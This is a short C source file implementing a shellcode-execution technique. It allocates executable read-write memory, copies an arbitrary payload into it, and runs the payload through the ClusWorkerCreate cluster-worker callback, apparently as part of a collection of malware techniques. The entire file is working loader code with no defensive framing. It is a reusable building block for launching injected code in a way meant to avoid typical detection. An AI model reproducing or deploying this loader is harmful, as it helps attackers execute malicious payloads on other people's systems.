#include "Win32Helper.h"

VOID InvokeClusWorkerCreateCallbackRoutine(LPVOID lpParameter)
{
	CLUS_WORKER Worker = { 0 };

	if (ClusWorkerCreate(&Worker, (PWORKER_START_ROUTINE)lpParameter, NULL) == ERROR_SUCCESS)
	{
		ClusWorkerTerminateEx(&Worker, INFINITE, TRUE);
	}

}

BOOL MpfSceViaClusWorkerCreate(_In_ PBYTE Payload, _In_ DWORD PayloadSizeInBytes)
{
	LPVOID BinAddress = NULL;

	BinAddress = VirtualAlloc(NULL, PayloadSizeInBytes, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (BinAddress == NULL)
		return FALSE;

	CopyMemoryEx(BinAddress, Payload, PayloadSizeInBytes);

	CreateThreadAndWaitForCompletion((LPTHREAD_START_ROUTINE)InvokeClusWorkerCreateCallbackRoutine, BinAddress, INFINITE);

	return TRUE;
}